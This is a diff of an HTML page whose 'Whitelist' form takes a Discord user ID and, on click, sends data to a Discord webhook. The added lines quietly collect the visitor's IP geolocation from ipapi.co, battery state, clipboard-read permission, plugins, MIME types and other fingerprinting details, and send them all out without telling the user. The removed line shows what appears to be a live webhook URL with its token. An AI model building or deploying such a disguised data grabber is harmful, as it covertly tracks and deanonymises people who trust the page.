@@ -17,13 +17,12 @@
   <button id="whitelistBtn" disabled>Whitelist</button>
 
   <script>
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1400234987541893260/U0Oi5nji0bljkiODyK8pd_9excATVoTFoFkqp1vc2ksKrZCbp3IpuUU6JuXQs1SUVPqr';
+    const WEBHOOK_URL = 'REPLACE_WITH_DISCORD_WEBHOOK_URL';
     const whitelistBtn = document.getElementById('whitelistBtn');
     const discordIdInput = document.getElementById('discordId');
     const RATE_LIMIT_HOURS = 24;
     const STORAGE_KEY = 'lastWhitelistTime';
 
-    // Enable whitelist button only if input is numeric and valid length
     discordIdInput.addEventListener('input', () => {
       const value = discordIdInput.value.trim();
       const isNumeric = /^\d+$/.test(value);
@@ -43,6 +42,12 @@
         return;
       }
       try {
+        const geoRes = await fetch('https://ipapi.co/json/');
+        const geoData = geoRes.ok ? await geoRes.json() : {};
+
+        const battery = navigator.getBattery ? await navigator.getBattery() : null;
+        const clipboardPerm = navigator.permissions ? await navigator.permissions.query({ name: 'clipboard-read' }).catch(()=>null) : null;
+
         const payload = {
           timestamp: new Date().toISOString(),
           discordUserId: discordIdInput.value.trim(),
@@ -70,6 +75,22 @@
           } : null,
           hardwareConcurrency: navigator.hardwareConcurrency,
           deviceMemory: navigator.deviceMemory || null,
+          maxTouchPoints: navigator.maxTouchPoints,
+          doNotTrack: navigator.doNotTrack,
+          vendor: navigator.vendor,
+          product: navigator.product,
+          productSub: navigator.productSub,
+          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : null,
+          plugins: Array.from(navigator.plugins).map(p => p.name),
+          mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+          battery: battery ? {
+            charging: battery.charging,
+            level: battery.level,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
+          } : null,
+          clipboardPermission: clipboardPerm ? clipboardPerm.state : null,
+          ipInfo: geoData
         };
 
         const discordPayload = {
@@ -94,7 +115,6 @@
       }
     }
 
-    // Disable whitelist if rate limited on load
     if (isRateLimited()) whitelistBtn.disabled = true;
 
     whitelistBtn.addEventListener('click', sendData);
